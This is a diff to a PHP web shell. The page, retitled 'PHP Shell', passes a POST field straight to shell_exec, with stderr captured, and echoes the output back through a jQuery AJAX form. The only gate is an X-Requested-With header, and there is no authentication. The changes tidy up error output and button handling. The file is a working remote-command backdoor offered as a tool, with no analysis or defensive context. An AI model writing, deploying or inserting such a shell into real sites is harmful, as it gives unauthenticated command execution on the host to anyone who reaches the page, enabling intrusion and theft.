@@ -1,15 +1,15 @@
 <?php
-
+$shell_output='';
 # php eval alternative
 # request sent using HTTP_X_REQUESTED_WITH
 if( isset( $_SERVER['HTTP_X_REQUESTED_WITH'] ) ){
   if(isset($_POST['shell_code'])){
     $name = trim($_POST['shell_code']);
     ob_start();
-    echo shell_exec($name);
+    echo shell_exec($name . " 2>&1") ;
     $shell_output = ob_get_contents();
     ob_end_clean();
-    echo $shell_output ? "<pre>$shell_output</pre>" : "Empty || Error";
+     echo $shell_output ? "<pre>$shell_output</pre>" : "Empty";
     return;
   }else{
     return;
@@ -22,7 +22,7 @@ if( isset( $_SERVER['HTTP_X_REQUESTED_WITH'] ) ){
 <html>
   <head>
     <meta charset="UTF-8">
-    <title>Localhost</title>
+    <title>PHP Shell</title>
     <style type="text/css">
       .clearfix:after {
         visibility: hidden;
@@ -140,12 +140,12 @@ if( isset( $_SERVER['HTTP_X_REQUESTED_WITH'] ) ){
                 data: form.serialize(), // serialize form data
                 beforeSend: function() {
                   shell_text.fadeOut();
-                  submit.html('Processing...'); // change submit button text
+                  // submit.attr('value', 'Processing...'); // change submit button text
                 },
                 success: function(data) {
                   shell_text.show(); // show the shell box
                   shell_text.html(data).fadeIn(); // fade in response data
-                  submit.html('Run'); // reset submit button text
+                  // submit.attr('value', 'Run'); // reset submit button text
                 },
                 error: function(e) {
                   console.log(e); //show error on console
